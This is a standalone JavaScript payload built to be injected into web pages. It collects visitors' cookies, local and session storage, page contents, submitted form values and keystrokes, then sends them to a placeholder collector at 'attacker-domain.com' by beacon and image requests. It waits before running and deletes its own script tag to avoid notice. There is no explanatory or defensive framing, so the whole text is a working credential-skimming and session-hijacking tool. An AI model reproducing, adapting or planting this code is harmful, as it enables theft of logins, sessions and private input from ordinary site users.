(() => {
    /* Stealth Mode Configuration */
    const config = {
        exfiltrationEndpoint: "https://attacker-domain.com/collector",
        beaconDelay: 1500,
        keylogging: true,
        formCapture: true,
        sessionHijacking: true,
        cleanup: true
    };

    /* Data Collection Modules */
    const harvest = {
        cookies: () => document.cookie,
        localStorage: () => JSON.stringify(localStorage),
        sessionStorage: () => JSON.stringify(sessionStorage),
        dom: () => document.documentElement.innerHTML,
        forms: () => {
            return Array.from(document.forms).map(form => ({
                action: form.action,
                method: form.method,
                inputs: Array.from(form.elements).map(input => ({
                    name: input.name,
                    type: input.type,
                    value: input.value
                }))
            }));
        },
        keys: (() => {
            let keystrokes = '';
            document.addEventListener('keypress', e => {
                keystrokes += String.fromCharCode(e.charCode);
            });
            return () => keystrokes;
        })()
    };

    /* Secure Beacon Transmission */
    const exfiltrate = (data, category) => {
        try {
            /* Primary Method: Fetch API */
            const payload = {
                timestamp: Date.now(),
                origin: location.href,
                userAgent: navigator.userAgent,
                category,
                data
            };

            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
            navigator.sendBeacon(config.exfiltrationEndpoint, blob);
        } catch (e) {
            /* Fallback Method: Image Beacon */
            new Image().src = `${config.exfiltrationEndpoint}?fallback=${encodeURIComponent(JSON.stringify(data))}`;
        }
    };

    /* Session Hijacking */
    const hijackSession = () => {
        const sessionData = {
            cookies: harvest.cookies(),
            localStorage: harvest.localStorage(),
            sessionStorage: harvest.sessionStorage()
        };
        exfiltrate(sessionData, 'session');
    };

    /* Form Interception */
    const interceptForms = () => {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', event => {
                const formData = harvest.forms().find(f => f.action === form.action);
                exfiltrate(formData, 'form_submission');
            });
        });
    };

    /* Execution Flow */
    const execute = () => {
        setTimeout(() => {
            hijackSession();
            
            if (config.formCapture) interceptForms();
            
            if (config.keylogging) {
                setInterval(() => {
                    const keys = harvest.keys();
                    if (keys.length > 0) exfiltrate(keys, 'keylog');
                }, 5000);
            }
            
            exfiltrate(harvest.dom(), 'dom_snapshot');
            
            if (config.cleanup) {
                const scriptElement = document.currentScript;
                scriptElement.parentNode.removeChild(scriptElement);
            }
        }, config.beaconDelay);
    };

    /* Entry Point */
    execute();
})();
